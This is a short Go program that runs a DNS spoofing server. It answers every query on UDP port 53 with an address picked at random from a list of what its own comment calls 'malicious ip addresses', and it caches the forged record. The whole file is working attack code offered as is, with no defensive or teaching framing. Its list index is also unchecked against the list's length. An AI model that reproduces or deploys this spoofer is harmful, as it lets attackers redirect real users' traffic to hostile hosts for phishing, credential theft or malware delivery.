package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"os"
	"time"

	"github.com/dns-spoofing/resolver"
	"github.com/miekg/dns"
)

type dnsHandler struct{}

func FakeIP(filename string) []string {
	f, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	r := bufio.NewScanner(f)
	res := []string{}
	for r.Scan() {
		res = append(res, r.Text())
	}
	return res
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)

	// getting malicious ip addresses
	l := FakeIP("list.txt")
	n := rand.Intn(51)

	for _, question := range r.Question {
		fake, err := dns.NewRR(fmt.Sprintf("%s IN %s %s", question.Name, dns.TypeToString[question.Qtype], l[n]))
		if err != nil {
			fmt.Println(err)
		}
		msg.Answer = append(msg.Answer, fake)
		resolver.NewCache.Set(question.Name, fake, 5*time.Minute)
	}
	w.WriteMsg(msg)
}

func main() {
	handler := new(dnsHandler)
	server := &dns.Server{
		Addr:      ":53",
		Net:       "udp",
		Handler:   handler,
		ReusePort: true,
	}
	err := server.ListenAndServe()
	if err != nil {
		fmt.Println(err.Error())
	}
}
